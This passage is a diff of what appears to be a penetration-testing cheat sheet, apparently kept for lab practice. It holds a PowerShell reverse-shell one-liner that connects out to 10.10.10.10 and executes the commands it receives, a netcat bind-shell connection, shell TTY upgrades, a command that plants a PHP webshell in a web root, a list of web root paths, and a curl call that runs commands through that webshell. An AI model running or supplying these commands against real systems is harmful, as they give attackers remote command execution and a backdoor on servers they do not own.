@@ -52,9 +52,14 @@ netcat can be used to connect to any listening port and interact with the servic
 > - **same as above but with powershell** powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 > - **Connect to a bind shell started on the remote server (on my computer)** nc 10.10.10.1 1234
 >
-> - **Upgrade shell TTY (1)
+> - **Upgrade shell TTY (1)** python -c 'import pty; pty.spawn("/bin/bash")'
+> - **Upgrade shell TTY (2)** ctrl+z then stty raw -echo then fg then enter twice
+> - **Create a webshell php file** echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php
+> - Apache	/var/www/html/   Nginx	/usr/local/nginx/html/   IIS	c:\inetpub\wwwroot\   XAMPP	C:\xampp\htdocs\
+> - **Execute a command on an uploaded webshell** curl http://SERVER_IP:PORT/shell.php?cmd=id
 
-> - 
+
+
   > whatweb --no-errors 10.10.10.0/24
   # 
   > 
